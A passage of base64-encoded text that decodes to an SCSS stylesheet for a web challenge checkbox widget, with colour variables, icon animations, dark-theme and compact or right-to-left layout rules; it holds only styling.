2xvci0zOiAjMjIyO1xuJGJhY2tncm91bmQtY29sb3ItNDogd2hpdGU7XG4kYmFja2dyb3VuZC1jb2xvci01OiAjNmQ2ZDZkO1xuJGNoZWNrYm94LWNvbG9yLTE6ICNmYmFkNDE7XG4kc3VjY2Vzcy1jb2xvci0xOiAjMGFhOTM3O1xuJHN1Y2Nlc3MtY29sb3ItMjogIzAzODEyNztcbiRkYXJrLW1hcmstY29sb3ItMTogI2RhZGFkYTtcbiRmYWlsLWNvbG9yLTE6ICNjNDRkMGU7XG4kYm9yZGVyLWNvbG9yLTE6ICRjaGVja2JveC1jb2xvci0xO1xuJGJvcmRlci1jb2xvci0yOiAjNjY2O1xuJGJvcmRlci1jb2xvci0zOiAjZmZhMjk5O1xuJGNvbnRlbnQtYm9yZGVyLWNvbG9yLTE6ICNlMGUwZTA7XG5cbkBrZXlmcmFtZXMgcm90YXRlIHtcbiAgICAxMDAlIHtcbiAgICAgICAgdHJhbnNmb3JtOiByb3RhdGUoMzYwZGVnKTtcbiAgICB9XG59XG5cbkBrZXlmcmFtZXMgc3Ryb2tlIHtcbiAgICAxMDAlIHtcbiAgICAgICAgc3Ryb2tlLWRhc2hvZmZzZXQ6IDA7XG4gICAgfVxufVxuXG5Aa2V5ZnJhbWVzIHNjYWxlIHtcbiAgICAwJSxcbiAgICAxMDAlIHtcbiAgICAgICAgdHJhbnNmb3JtOiBub25lO1xuICAgIH1cblxuICAgIDUwJSB7XG4gICAgICAgIHRyYW5zZm9ybTogc2NhbGUzZCgxLCAxLCAxKTtcbiAgICB9XG59XG5cbkBrZXlmcmFtZXMgZmlsbCB7XG4gICAgMTAwJSB7XG4gICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMSk7XG4gICAgfVxufVxuXG5Aa2V5ZnJhbWVzIGZpbGxmYWlsIHtcbiAgICAxMDAlIHtcbiAgICAgICAgYm94LXNoYWRvdzogaW5zZXQgMCAwIDAgMzBweCAkZmFpbC1jb2xvci0xO1xuICAgIH1cbn1cblxuQGtleWZyYW1lcyBmaWxsZmFpbC1vZmZsYWJlbCB7XG4gICAgMTAwJSB7XG4gICAgICAgIGJveC1zaGFkb3c6IGluc2V0IDAgMCAwIDMwcHggJGNvbG9yLTE7XG4gICAgfVxufVxuXG5Aa2V5ZnJhbWVzIGZpbGxmYWlsLW9mZmxhYmVsLWRhcmsge1xuICAgIDEwMCUge1xuICAgICAgICBib3gtc2hhZG93OiBpbnNldCAwIDAgMCAzMHB4ICNmZmY7XG4gICAgfVxufVxuXG5Aa2V5ZnJhbWVzIHNjYWxlLXVwLWNlbnRlciB7XG4gICAgMCUge1xuICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDAuMDEpO1xuICAgIH1cblxuICAgIDEwMCUge1xuICAgICAgICB0cmFuc2Zvcm06IHNjYWxlKDEpO1xuICAgIH1cbn1cblxuQGtleWZyYW1lcyB1bnNwaW4ge1xuICAgIDQwJSB7XG4gICAgICAgIHN0cm9rZS13aWR0aDogMXB4O1xuICAgICAgICBzdHJva2UtbGluZWNhcDogc3F1YXJlO1xuICAgICAgICBzdHJva2UtZGFzaG9mZnNldDogMTkyO1xuICAgIH1cblxuICAgIDEwMCUge1xuICAgICAgICBzdHJva2Utd2lkdGg6IDA7XG4gICAgfVxufVxuXG5odG1sIHtcbiAgICBtYXJnaW46IDA7XG4gICAgcGFkZGluZzogMDtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBoZWlnaHQ6IDEwMCU7XG4gICAgb3ZlcmZsb3c6IGhpZGRlbjtcbn1cblxuYm9keSB7XG4gICAgbWFyZ2luOiAwO1xuICAgIGJhY2tncm91bmQtY29sb3I6ICRiYWNrZ3JvdW5kLWNvbG9yLTE7XG4gICAgcGFkZGluZzogMDtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBoZWlnaHQ6IDEwMCU7XG4gICAgb3ZlcmZsb3c6IGhpZGRlbjtcbiAgICBsaW5lLWhlaWdodDogMTdweDtcbiAgICBjb2xvcjogJGNvbG9yLTE7XG4gICAgZm9udC1mYW1pbHk6ICRmb250LWZhbWlseS1ub3JtYWw7XG4gICAgZm9udC1zaXplOiAxNHB4O1xuICAgIGZvbnQtd2VpZ2h0OiA0MDA7XG4gICAgLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7XG4gICAgZm9udC1zdHlsZTogbm9ybWFsO1xufVxuXG5oMSB7XG4gICAgbWFyZ2luOiAxNnB4IDA7XG4gICAgdGV4dC1hbGlnbjogY2VudGVyO1xuICAgIGxpbmUtaGVpZ2h0OiAxLjI1O1xuICAgIGNvbG9yOiAkY29sb3ItMTtcbiAgICBmb250LXNpemU6IDE2cHg7XG4gICAgZm9udC13ZWlnaHQ6IDcwMDtcbn1cblxucCB7XG4gICAgbWFyZ2luOiA4cHggMDtcbiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gICAgZm9udC1zaXplOiAyMHB4O1xuICAgIGZvbnQtd2VpZ2h0OiA0MDA7XG59XG5cbiNjb250ZW50IHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gICAganVzdGlmeS1jb250ZW50OiBzcGFjZS1iZXR3ZWVuO1xuICAgIGJvcmRlcjogMXB4IHNvbGlkICRjb250ZW50LWJvcmRlci1jb2xvci0xO1xuICAgIGJhY2tncm91bmQtY29sb3I6ICRiYWNrZ3JvdW5kLWNvbG9yLTI7XG4gICAgaGVpZ2h0OiA2M3B4O1xuICAgIHVzZXItc2VsZWN0OiBub25lO1xufVxuXG4jY2hhbGxlbmdlLXN0YWdlIHtcbiAgICBkaXNwbGF5OiBmbGV4O1xufVxuXG4jYnJhbmRpbmcge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbiAgICBtYXJnaW46IDAgMTZweCAwIDA7XG4gICAgdGV4dC1hbGlnbjogcmlnaHQ7XG59XG5cbiNzcGlubmVyLWljb24ge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgbWFyZ2luLXJpZ2h0OiA4cHg7XG4gICAgd2lkdGg6IDMwcHg7XG4gICAgaGVpZ2h0OiAzMHB4O1xuICAgIGFuaW1hdGlvbjogcm90YXRlIDVzIGxpbmVhciBpbmZpbml0ZTtcbn1cblxuI2ZhaWwtaWNvbiB7XG4gICAgZGlzcGxheTogZmxleDtcbiAgICBtYXJnaW4tcmlnaHQ6IDhweDtcbiAgICBib3JkZXItcmFkaXVzOiA1MCU7XG4gICAgYm94LXNoYWRvdzogaW5zZXQgMCAwIDAgJGZhaWwtY29sb3ItMTtcbiAgICB3aWR0aDogMzBweDtcbiAgICBoZWlnaHQ6IDMwcHg7XG4gICAgYW5pbWF0aW9uOlxuICAgICAgICBmaWxsZmFpbCAwLjRzIGVhc2UtaW4tb3V0IDAuNHMgZm9yd2FyZHMsXG4gICAgICAgIHNjYWxlIDAuM3MgZWFzZS1pbi1vdXQgMC45cyBib3RoO1xuICAgIHN0cm9rZS13aWR0aDogNnB4O1xuICAgIHN0cm9rZTogI2Y4ZjhmODtcbiAgICBzdHJva2UtbWl0ZXJsaW1pdDogMTA7XG59XG5cbiNzdWNjZXNzLWljb24ge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgbWFyZ2luLXJpZ2h0OiA4cHg7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICAgIGJveC1zaGFkb3c6IGluc2V0IDAgMCAwICRzdWNjZXNzLWNvbG9yLTI7XG4gICAgd2lkdGg6IDMwcHg7XG4gICAgaGVpZ2h0OiAzMHB4O1xuICAgIGFuaW1hdGlvbjogc2NhbGUtdXAtY2VudGVyIDAuNnMgY3ViaWMtYmV6aWVyKDAuNTUsIDAuMDg1LCAwLjY4LCAwLjUzKSBib3RoO1xuICAgIHN0cm9rZS13aWR0aDogNnB4O1xuICAgIHN0cm9rZTogI2Y4ZjhmODtcbiAgICBzdHJva2UtbWl0ZXJsaW1pdDogMTA7XG5cbiAgICAucDEge1xuICAgICAgICBzdHJva2UtZGFzaGFycmF5OiAyNDI7XG4gICAgICAgIHN0cm9rZS1kYXNob2Zmc2V0OiAyNDI7XG4gICAgICAgIGJveC1zaGFkb3c6IGluc2V0IDAgMCAwICRzdWNjZXNzLWNvbG9yLTI7XG4gICAgICAgIGFuaW1hdGlvbjogc3Ryb2tlIDAuNHMgY3ViaWMtYmV6aWVyKDAuNjUsIDAsIDAuNDUsIDEpIGZvcndhcmRzO1xuICAgICAgICBhbmltYXRpb24tZGVsYXk6IDAuNXM7XG4gICAgfVxufVxuXG4uc3VjY2Vzcy1jaXJjbGUge1xuICAgIHN0cm9rZS1kYXNob2Zmc2V0OiAwO1xuICAgIHN0cm9rZS13aWR0aDogMjtcbiAgICBzdHJva2UtbWl0ZXJsaW1pdDogMTA7XG4gICAgc3Ryb2tlOiAkc3VjY2Vzcy1jb2xvci0yO1xuICAgIGZpbGw6ICRzdWNjZXNzLWNvbG9yLTI7XG59XG5cbi50aGVtZS1kYXJrIHtcbiAgICAjc3VjY2Vzcy1pY29uIHtcbiAgICAgICAgYm94LXNoYWRvdzogaW5zZXQgMCAwIDAgJHN1Y2Nlc3MtY29sb3ItMTtcblxuICAgICAgICAucDEge1xuICAgICAgICAgICAgYm94LXNoYWRvdzogaW5zZXQgMCAwIDAgJHN1Y2Nlc3MtY29sb3ItMTtcbiAgICAgICAgfVxuICAgIH1cblxuICAgIC5zdWNjZXNzLWNpcmNsZSB7XG4gICAgICAgIHN0cm9rZTogJHN1Y2Nlc3MtY29sb3ItMTtcbiAgICAgICAgZmlsbDogJHN1Y2Nlc3MtY29sb3ItMTtcbiAgICB9XG5cbiAgICAjY2hhbGxlbmdlLW92ZXJsYXkge1xuICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAkYmFja2dyb3VuZC1jb2xvci0zO1xuICAgIH1cblxuICAgICNjaGFsbGVuZ2Utb3ZlcmxheSxcbiAgICAjY2hhbGxlbmdlLWVycm9yLXRleHQge1xuICAgICAgICBjb2xvcjogJGNvbG9yLTM7XG5cbiAgICAgICAgYSB7XG4gICAgICAgICAgICBjb2xvcjogJGNvbG9yLTY7XG5cbiAgICAgICAgICAgICY6dmlzaXRlZCxcbiAgICAgICAgICAgICY6bGluayB7XG4gICAgICAgICAgICAgICAgY29sb3I6ICRjb2xvci02O1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAmOmhvdmVyLFxuICAgICAgICAgICAgJjphY3RpdmUsXG4gICAgICAgICAgICAmOmZvY3VzIHtcbiAgICAgICAgICAgICAgICBjb2xvcjogJGNvbG9yLTc7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICAuY2ItbGIge1xuICAgICAgICAuY2ItaSB7XG4gICAgICAgICAgICBib3JkZXI6IDJweCBzb2xpZCAkZGFyay1tYXJrLWNvbG9yLTE7XG4gICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAkYmFja2dyb3VuZC1jb2xvci0zO1xuICAgICAgICB9XG5cbiAgICAgICAgaW5wdXQge1xuICAgICAgICAgICAgJjpmb2N1cyxcbiAgICAgICAgICAgICY6YWN0aXZlIHtcbiAgICAgICAgICAgICAgICB+IHtcbiAgICAgICAgICAgICAgICAgICAgLmNiLWkge1xuICAgICAgICAgICAgICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgJGNoZWNrYm94LWNvbG9yLTE7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG5cbiAgICAgICAgICAgICY6Y2hlY2tlZCB7XG4gICAgICAgICAgICAgICAgfiB7XG4gICAgICAgICAgICAgICAgICAgIC5jYi1pIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICRiYWNrZ3JvdW5kLWNvbG9yLTU7XG5cbiAgICAgICAgICAgICAgICAgICAgICAgICY6OmFmdGVyIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3JkZXItY29sb3I6ICRib3JkZXItY29sb3ItMTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgIH1cblxuICAgIC5vZmZsYWJlbCB7XG4gICAgICAgICNmYWlsLWljb24ge1xuICAgICAgICAgICAgYm94LXNoYWRvdzogaW5zZXQgMCAwIDAgI2ZmZjtcbiAgICAgICAgICAgIGFuaW1hdGlvbjpcbiAgICAgICAgICAgICAgICBmaWxsZmFpbC1vZmZsYWJlbC1kYXJrIDAuNHMgZWFzZS1pbi1vdXQgMC40cyBmb3J3YXJkcyxcbiAgICAgICAgICAgICAgICBzY2FsZSAwLjNzIGVhc2UtaW4tb3V0IDAuOXMgYm90aDtcbiAgICAgICAgfVxuICAgIH1cblxuICAgIGgxIHtcbiAgICAgICAgY29sb3I6ICRjb2xvci01O1xuICAgIH1cblxuICAgICNjaGFsbGVuZ2UtZXJyb3ItdGl0bGUge1xuICAgICAgICBjb2xvcjogJGNvbG9yLTM7XG5cbiAgICAgICAgYSB7XG4gICAgICAgICAgICBjb2xvcjogJGNvbG9yLTY7XG5cbiAgICAgICAgICAgICY6dmlzaXRlZCxcbiAgICAgICAgICAgICY6bGluayB7XG4gICAgICAgICAgICAgICAgY29sb3I6ICRjb2xvci02O1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAmOmhvdmVyLFxuICAgICAgICAgICAgJjphY3RpdmUsXG4gICAgICAgICAgICAmOmZvY3VzIHtcbiAgICAgICAgICAgICAgICBjb2xvcjogJGNvbG9yLTc7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICAjdGVybXMge1xuICAgICAgICBjb2xvcjogJGNvbG9yLTY7XG5cbiAgICAgICAgYSB7XG4gICAgICAgICAgICBjb2xvcjogJGNvbG9yLTY7XG5cbiAgICAgICAgICAgICY6dmlzaXRlZCxcbiAgICAgICAgICAgICY6bGluayB7XG4gICAgICAgICAgICAgICAgY29sb3I6ICRjb2xvci02O1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAmOmhvdmVyLFxuICAgICAgICAgICAgJjphY3RpdmUsXG4gICAgICAgICAgICAmOmZvY3VzIHtcbiAgICAgICAgICAgICAgICBjb2xvcjogJGNvbG9yLTc7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICAjY29udGVudCB7XG4gICAgICAgIGJvcmRlci1jb2xvcjogJGJvcmRlci1jb2xvci0yO1xuICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAkYmFja2dyb3VuZC1jb2xvci0zO1xuICAgIH1cblxuICAgICNxciB7XG4gICAgICAgIGZpbGw6IHJnYigyNDMgMTI4IDMyKTtcbiAgICB9XG5cbiAgICAubG9nby10ZXh0IHtcbiAgICAgICAgZmlsbDogI2ZmZjtcbiAgICB9XG5cbiAgICAjZnItaGVscGVyLWxpbmssXG4gICAgI2ZyLWhlbHBlci1sb29wLWxpbmsge1xuICAgICAgICBjb2xvcjogJGNvbG9yLTY7XG5cbiAgICAgICAgJjp2aXNpdGVkLFxuICAgICAgICAmOmxpbmsge1xuICAgICAgICAgICAgY29sb3I6ICRjb2xvci02O1xuICAgICAgICB9XG5cbiAgICAgICAgJjphY3RpdmUsXG4gICAgICAgICY6aG92ZXIsXG4gICAgICAgICY6Zm9jdXMge1xuICAgICAgICAgICAgY29sb3I6ICRjb2xvci03O1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgI3RpbWVvdXQtcmVmcmVzaC1saW5rLFxuICAgICNleHBpcmVkLXJlZnJlc2gtbGluayB7XG4gICAgICAgIGNvbG9yOiAkY29sb3ItNjtcblxuICAgICAgICAmOnZpc2l0ZWQsXG4gICAgICAgICY6bGluayB7XG4gICAgICAgICAgICBjb2xvcjogJGNvbG9yLTY7XG4gICAgICAgIH1cblxuICAgICAgICAmOmFjdGl2ZSxcbiAgICAgICAgJjpob3ZlcixcbiAgICAgICAgJjpmb2N1cyB7XG4gICAgICAgICAgICBjb2xvcjogJGNvbG9yLTc7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICAub3ZlcmxheSB7XG4gICAgICAgIGJvcmRlci1jb2xvcjogJGJvcmRlci1jb2xvci0zO1xuICAgICAgICBjb2xvcjogJGNvbG9yLTM7XG4gICAgfVxufVxuXG4jY2hhbGxlbmdlLWVycm9yIHtcbiAgICBtYXJnaW46IDAgOHB4O1xufVxuXG4jY2hhbGxlbmdlLW92ZXJsYXkge1xuICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICB0b3A6IDA7XG4gICAgei1pbmRleDogOTk5OTtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAkYmFja2dyb3VuZC1jb2xvci0yO1xufVxuXG4jY2hhbGxlbmdlLW92ZXJsYXksXG4jY2hhbGxlbmdlLWVycm9yLXRleHQge1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBsaW5lLWhlaWdodDogMTBweDtcbiAgICBjb2xvcjogJGNvbG9yLTI7XG4gICAgZm9udC1zaXplOiA5cHg7XG5cbiAgICBhIHtcbiAgICAgICAgY29sb3I6ICRjb2xvci0xO1xuXG4gICAgICAgICY6dmlzaXRlZCxcbiAgICAgICAgJjpsaW5rIHtcbiAgICAgICAgICAgIGNvbG9yOiAkY29sb3ItMTtcbiAgICAgICAgfVxuXG4gICAgICAgICY6YWN0aXZlLFxuICAgICAgICAmOmhvdmVyLFxuICAgICAgICAmOmZvY3VzIHtcbiAgICAgICAgICAgIGNvbG9yOiAkY29sb3ItNDtcbiAgICAgICAgfVxuICAgIH1cbn1cblxuI2xvZ28ge1xuICAgIG1hcmdpbi1ib3R0b206IDFweDtcbiAgICBoZWlnaHQ6IDI2cHg7XG59XG5cbi5mYWlsdXJlLWNpcmNsZSB7XG4gICAgc3Ryb2tlLWRhc2hhcnJheTogMTY2O1xuICAgIHN0cm9rZS1kYXNob2Zmc2V0OiAxNjY7XG4gICAgc3Ryb2tlLXdpZHRoOiAyO1xuICAgIHN0cm9rZS1taXRlcmxpbWl0OiAxMDtcbiAgICBzdHJva2U6ICRmYWlsLWNvbG9yLTE7XG4gICAgZmlsbDogbm9uZTtcbiAgICBhbmltYXRpb246IHN0cm9rZSAwLjZzIGN1YmljLWJlemllcigwLjY1LCAwLCAwLjQ1LCAxKSBmb3J3YXJkcztcbn1cblxuLmZhaWx1cmUtY3Jvc3Mge1xuICAgIHRyYW5zZm9ybS1vcmlnaW46IDUwJSA1MCU7XG4gICAgc3Ryb2tlLWRhc2hhcnJheTogNDg7XG4gICAgc3Ryb2tlLWRhc2hvZmZzZXQ6IDQ4O1xuICAgIGFuaW1hdGlvbjogc3Ryb2tlIDAuM3MgY3ViaWMtYmV6aWVyKDAuNjUsIDAsIDAuNDUsIDEpIDAuOHMgZm9yd2FyZHM7XG59XG5cbi5jYi1jIHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gICAgbWFyZ2luLWxlZnQ6IDExcHg7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGxlZnQ7XG59XG5cbi5jYi1sYiB7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHBhZGRpbmctbGVmdDogMzdweDtcblxuICAgIGlucHV0IHtcbiAgICAgICAgcG9zaXRpb246IGFic29sdXRlO1xuICAgICAgICB0b3A6IDIwcHg7XG4gICAgICAgIGxlZnQ6IDE4cHg7XG4gICAgICAgIG9wYWNpdHk6IDA7XG4gICAgICAgIHotaW5kZXg6IDk5OTk7XG4gICAgICAgIGN1cnNvcjogcG9pbnRlcjtcbiAgICAgICAgd2lkdGg6IDI0cHg7XG4gICAgICAgIGhlaWdodDogMjRweDtcblxuICAgICAgICAmOmFjdGl2ZSB7XG4gICAgICAgICAgICB+IHtcbiAgICAgICAgICAgICAgICAuY2ItaSB7XG4gICAgICAgICAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICRmYWlsLWNvbG9yLTE7XG4gICAgICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAgICAgc3Bhbi5jYi1sYi10IHtcbiAgICAgICAgICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG5cbiAgICAgICAgJjpmb2N1cyB7XG4gICAgICAgICAgICB+IHtcbiAgICAgICAgICAgICAgICAuY2ItaSB7XG4gICAgICAgICAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICRmYWlsLWNvbG9yLTE7XG4gICAgICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAgICAgc3Bhbi5jYi1sYi10IHtcbiAgICAgICAgICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG5cbiAgICAgICAgJjpjaGVja2VkIHtcbiAgICAgICAgICAgIH4ge1xuICAgICAgICAgICAgICAgIC5jYi1pIHtcbiAgICAgICAgICAgICAgICAgICAgdHJhbnNmb3JtOiByb3RhdGUoMGRlZykgc2NhbGUoMSk7XG4gICAgICAgICAgICAgICAgICAgIG9wYWNpdHk6IDE7XG4gICAgICAgICAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDVweDtcbiAgICAgICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogJGJhY2tncm91bmQtY29sb3ItNDtcblxuICAgICAgICAgICAgICAgICAgICAmOjphZnRlciB7XG4gICAgICAgICAgICAgICAgICAgICAgICB0b3A6IDNweDtcbiAgICAgICAgICAgICAgICAgICAgICAgIGxlZnQ6IDhweDtcbiAgICAgICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogcm90YXRlKDQ1ZGVnKSBzY2FsZSgxKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJvcmRlcjogc29saWQgJGZhaWwtY29sb3ItMTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJvcmRlci13aWR0aDogMCA0cHggNHB4IDA7XG4gICAgICAgICAgICAgICAgICAgICAgICBib3JkZXItcmFkaXVzOiAwO1xuICAgICAgICAgICAgICAgICAgICAgICAgd2lkdGg6IDZweDtcbiAgICAgICAgICAgICAgICAgICAgICAgIGhlaWdodDogMTJweDtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgIH1cblxuICAgIC5jYi1pIHtcbiAgICAgICAgcG9zaXRpb246IGFic29sdXRlO1xuICAgICAgICB0b3A6IDIwcHg7XG4gICAgICAgIGxlZnQ6IDE4cHg7XG4gICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjFzIGVhc2UtaW47XG4gICAgICAgIHotaW5kZXg6IDk5OTg7XG4gICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICRiYWNrZ3JvdW5kLWNvbG9yLTU7XG4gICAgICAgIGJvcmRlci1yYWRpdXM6IDNweDtcbiAgICAgICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICAgICAgd2lkdGg6IDI0cHg7XG4gICAgICAgIGhlaWdodDogMjRweDtcbiAgICAgICAgYW5pbWF0aW9uOiBzY2FsZS11cC1jZW50ZXIgMC40cyBjdWJpYy1iZXppZXIoMC41NSwgMC4wODUsIDAuNjgsIDAuNTMpIGJvdGg7XG5cbiAgICAgICAgJjo6YWZ0ZXIge1xuICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlO1xuICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4O1xuICAgICAgICAgICAgY29udGVudDogJyc7XG4gICAgICAgIH1cbiAgICB9XG59XG5cbi5zaXplLWNvbXBhY3Qge1xuICAgIGZvbnQtc2l6ZTogMTNweDtcblxuICAgIC5jYi1sYiB7XG4gICAgICAgIC5jYi1pIHtcbiAgICAgICAgICAgIGxlZnQ6IDE1cHg7XG4gICAgICAgIH1cblxuICAgICAgICBpbnB1dCB7XG4gICAgICAgICAgICBsZWZ0OiAxNXB4O1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgI2NvbnRlbnQge1xuICAgICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgICBmbGV4LWZsb3c6IGNvbHVtbiBub3dyYXA7XG4gICAgICAgIHBsYWNlLWNvbnRlbnQ6IGNlbnRlciBjZW50ZXI7XG4gICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gICAgICAgIGhlaWdodDogMTE4cHg7XG4gICAgfVxuXG4gICAgLmxpbmstc3BhY2VyIHtcbiAgICAgICAgbWFyZ2luLXJpZ2h0OiAzcHg7XG4gICAgICAgIG1hcmdpbi1sZWZ0OiAzcHg7XG4gICAgfVxuXG4gICAgLmNiLWMge1xuICAgICAgICB0ZXh0LWFsaWduOiBsZWZ0O1xuICAgIH1cblxuICAgICNsb2dvIHtcbiAgICAgICAgbWFyZ2luLXRvcDogNXB4O1xuICAgICAgICBtYXJnaW4tYm90dG9tOiAwO1xuICAgICAgICBoZWlnaHQ6IDIycHg7XG4gICAgfVxuXG4gICAgLmNiLWNvbnRhaW5lciB7XG4gICAgICAgIG1hcmdpbi10b3A6IDNweDtcbiAgICAgICAgbWFyZ2luLWxlZnQ6IDA7XG4gICAgfVxuXG4gICAgI2JyYW5kaW5nIHtcbiAgICAgICAgZGlzcGxheTogZmxleDtcbiAgICAgICAgZmxleC1mbG93OiByb3ctcmV2ZXJzZSB3cmFwO1xuICAgICAgICBwbGFjZS1jb250ZW50OiBjZW50ZXIgZmxleC1zdGFydDtcbiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICAgICAgbWFyZ2luOiA1cHggMTZweCAwO1xuICAgICAgICBwYWRkaW5nLXJpZ2h0OiAwO1xuICAgICAgICB0ZXh0LWFsaWduOiByaWdodDtcbiAgICB9XG5cbiAgICAjdGVybXMge1xuICAgICAgICB0ZXh0LWFsaWduOiByaWdodDtcbiAgICB9XG5cbiAgICAjcXIge1xuICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gICAgfVxuXG4gICAgI2NoYWxsZW5nZS1lcnJvci10aXRsZSB7XG4gICAgICAgIG1hcmdpbi10b3A6IDNweDtcbiAgICAgICAgd2lkdGg6IGF1dG87XG4gICAgfVxuXG4gICAgI2ZhaWwge1xuICAgICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgICBmbGV4LWZsb3c6IHJvdyBub3dyYXA7XG4gICAgICAgIHBsYWNlLWNvbnRlbnQ6IGNlbnRlciBzcGFjZS1ldmVubHk7XG4gICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gICAgICAgIHZpc2liaWxpdHk6IHZpc2libGU7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAxM3B4O1xuICAgICAgICBmb250LXNpemU6IDExcHg7XG4gICAgfVxuXG4gICAgI2ZhaWwtaWNvbiB7XG4gICAgICAgIG1hcmdpbi1yaWdodDogNHB4O1xuICAgICAgICB3aWR0aDogMjVweDtcbiAgICAgICAgaGVpZ2h0OiAyNXB4O1xuICAgIH1cblxuICAgICN0aW1lb3V0LFxuICAgICNleHBpcmVkIHtcbiAgICAgICAgbWFyZ2luLXRvcDogOXB4O1xuICAgICAgICBtYXJnaW4tbGVmdDogMTFweDtcbiAgICB9XG5cbiAgICAjY2hhbGxlbmdlLWVycm9yIHtcbiAgICAgICAgbWFyZ2luOiAwIDJweDtcbiAgICB9XG59XG5cbi5jYi1sYi10IHtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGZsZXgtZmxvdzogcm93LXJldmVyc2Ugbm93cmFwO1xuICAgIHBsYWNlLWNvbnRlbnQ6IGNlbnRlciBmbGV4LWVuZDtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAgIHBhZGRpbmctbGVmdDogMnB4O1xufVxuXG4ucnRsIHtcbiAgICAuY2ItbGItdCB7XG4gICAgICAgIHBhZGRpbmctcmlnaHQ6IDJweDtcbiAgICAgICAgcGFkZGluZy1sZWZ0OiAwO1xuICAgIH1cblxuICAgICNzdWNjZXNzLWljb24ge1xuICAgICAgICBsZWZ0OiAyNTVweDtcbiAgICAgICAgbWFyZ2luLWxlZnQ6IDhweDtcbiAgICB9XG5cbiAgICAjZmFpbC1pY29uIHtcbiAgICAgICAgbGVmdDogMjU1cHg7XG4gICAgICAgIG1hcmdpbi1sZWZ0OiA4cHg7XG4gICAgfVxuXG4gICAgI3NwaW5uZXItaWNvbiB7XG4gICAgICAgIGxlZnQ6IDI1NXB4O1xuICAgICAgICBtYXJnaW4tbGVmdDogOHB4O1xuICAgIH1cblxuICAgICN0aW1lb3V0LWljb24sXG4gICAgI2V4cGlyZWQtaWNvbiB7XG4gICAgICAgIGxlZnQ6IDI1NXB4O1xuICAgICAgICBtYXJnaW4tbGVmdDogOHB4O1xuICAgIH1cblxuICAgICNicmFuZGluZyB7XG4gICAgICAgIG1hcmdpbjogMCAwIDAgMTZweDtcbiAgICAgICAgcGFkZGluZy1yaWdodDogMDtcbiAgICAgICAgcGFkZGluZy1sZWZ0OiAwO1xuICAgICAgICB3aWR0aDogOTBweDtcbiAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyO1xuICAgIH1cblxuICAgIC5za